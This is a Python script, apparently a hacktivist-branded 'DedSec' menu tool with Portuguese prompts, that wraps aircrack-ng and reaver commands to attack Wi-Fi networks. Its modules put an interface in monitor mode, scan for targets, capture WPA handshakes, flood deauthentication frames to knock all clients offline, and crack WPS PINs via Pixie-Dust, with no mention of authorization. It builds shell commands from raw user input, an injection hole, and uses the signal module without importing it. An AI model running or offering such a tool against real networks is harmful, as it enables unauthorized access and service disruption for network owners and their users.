import os
import sys
import time
from colorama import Fore, Style, init

init(autoreset=True)

def show_base_banner(operation_name, mode_name):
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Fore.CYAN}    ██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗
{Fore.CYAN}    ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝
{Fore.WHITE}    ██║  ██║█████╗  ██║  ██║███████╗█████╗  ██║     
{Fore.WHITE}    ██║  ██║██╔══╝  ██║  ██║╚════██║██╔══╝  ██║     
{Fore.CYAN}    ██████╔╝███████╗██████╔╝███████║███████╗╚██████╗
{Fore.CYAN}    ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝ ╚═════╝
{Fore.WHITE}             WIFI INFILTRATION - DEDSEC WIRELESS
    
{Fore.GREEN}    [+] Create by: DedSec Security
{Fore.GREEN}    [+] Operation: DedSec_DDoS Atack
{Fore.GREEN}    [+] Mode: WI-FI PNETRATION
{Fore.YELLOW}    ----------------------------------------------------------------------
    """)

def panic_button(sig, frame):
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"\n{Fore.RED}[!] BOTÃO DE PÂNICO ATIVADO - Sessão Encerrada.")
    print(f"{Fore.GREEN}A DedSec lhe deu a verdade. Não perdoamos. Não esquecemos.")
    sys.exit(0)

signal.signal(signal.SIGINT, panic_button)

def activate_monitor_mode():
    show_base_banner("Ativação de Interface", "Modo Monitor")
    iface = input(f"{Fore.BLUE}[?] Nome da interface Wi-Fi (ex: wlan0): ")
    print(f"{Fore.CYAN}[*] Ativando Modo Monitor em {iface}...")
    os.system(f"sudo airmon-ng start {iface}")
    input(f"\n{Fore.YELLOW}[*] Modo Monitor ativado. Pressione Enter para continuar...")

def scan_networks():
    show_base_banner("Varredura de Redes", "Coleta de Informações (BSSID/Canal)")
    iface = input(f"{Fore.BLUE}[?] Interface em Modo Monitor (ex: wlan0mon): ")
    print(f"{Fore.YELLOW}[!] Pressione CTRL+C quando encontrar o alvo e o canal.")
    os.system(f"sudo airodump-ng {iface}")
    input(f"\n{Fore.YELLOW}[*] Varredura encerrada. Pressione Enter para continuar...")

def capture_handshake():
    show_base_banner("Captura de Handshake", "Infiltração WPA2/WPA3")
    iface = input(f"{Fore.BLUE}[?] Interface em Modo Monitor (ex: wlan0mon): ")
    bssid = input(f"{Fore.BLUE}[?] BSSID do Alvo: ")
    canal = input(f"{Fore.BLUE}[?] Canal do Alvo: ")
    arquivo = "captura_dedsec"

    print(f"{Fore.GREEN}[+] Capturando Handshake em {bssid} no Canal {canal}...")
    print(f"{Fore.RED}[!] DICA: Rode um ataque de Deauth em outro terminal para acelerar.")
    os.system(f"sudo airodump-ng -c {canal} --bssid {bssid} -w {arquivo} {iface}")
    input(f"\n{Fore.YELLOW}[*] Captura encerrada. Arquivo '{arquivo}-01.cap' criado. Pressione Enter para continuar...")

def run_deauth_attack():
    show_base_banner("Ataque de Desautenticação", "Derrubar Clientes da Rede")
    target_bssid = input(f"{Fore.BLUE}[?] BSSID do Alvo (Router): ")
    client_bssid = input(f"{Fore.BLUE}[?] BSSID do Cliente (ou FF:FF:FF:FF:FF:FF para todos): ")
    iface = input(f"{Fore.BLUE}[?] Interface em Modo Monitor (ex: wlan0mon): ")
    print(f"{Fore.YELLOW}[*] Derrubando conexões para {target_bssid}... Pressione CTRL+C para parar.")
    os.system(f"sudo aireplay-ng --deauth 0 -a {target_bssid} -c {client_bssid} {iface}")
    input(f"\n{Fore.YELLOW}[*] Ataque de Deauth encerrado. Pressione Enter para continuar...")

def run_wps_attack():
    show_base_banner("Ataque de PIN WPS", "Quebra de Senha via Pixie-Dust")
    bssid = input(f"{Fore.BLUE}[?] BSSID do Alvo: ")
    iface = input(f"{Fore.BLUE}[?] Interface em Modo Monitor (ex: wlan0mon): ")
    print(f"{Fore.YELLOW}[*] Tentando quebrar o PIN WPS para {bssid}...")
    os.system(f"sudo reaver -i {iface} -b {bssid} -K 1 -vv") # ou bully
    input(f"\n{Fore.YELLOW}[*] Ataque WPS encerrado. Pressione Enter para continuar...")

def main_menu():
    while True:
        show_base_banner("Menu Principal", "Seleção de Módulos de Infiltração")
        print(f"{Fore.GREEN}1. {Fore.WHITE}Ativar Modo Monitor (airmon-ng start)")
        print(f"{Fore.GREEN}2. {Fore.WHITE}Escanear Redes Wi-Fi (airodump-ng)")
        print(f"{Fore.GREEN}3. {Fore.WHITE}Capturar Handshake WPA/WPA2")
        print(f"{Fore.GREEN}4. {Fore.WHITE}Ataque de Desautenticação (Deauth)")
        print(f"{Fore.GREEN}5. {Fore.WHITE}Ataque de PIN WPS (Pixie-Dust)")
        print(f"{Fore.RED}0. {Fore.WHITE}Sair")
        
        escolha = input(f"\n{Fore.CYAN}Selecione o módulo para a operação: ")
        
        if escolha == '1':
            activate_monitor_mode()
        elif escolha == '2':
            scan_networks()
        elif escolha == '3':
            capture_handshake()
        elif escolha == '4':
            run_deauth_attack()
        elif escolha == '5':
            run_wps_attack()
        elif escolha == '0':
            print(f"\n{Fore.GREEN}A DedSec lhe deu a verdade. Não perdoamos. Não esquecemos.")
            sys.exit(0)
        else:
            print(f"{Fore.RED}[!] Opção inválida. Tente novamente.")
            time.sleep(1)

if __name__ == "__main__":
    if os.name == 'nt':
        print(f"{Fore.RED}[X] ERRO: Windows não suporta injeção de pacotes Wi-Fi nativa.")
        print(f"{Fore.YELLOW}[!] Use o Kali Linux ou o Termux (com Root) no seu Edge 40 Neo para este módulo.")
        input(f"\n{Fore.YELLOW}[*] Pressione Enter para sair...")
    else:
        main_menu()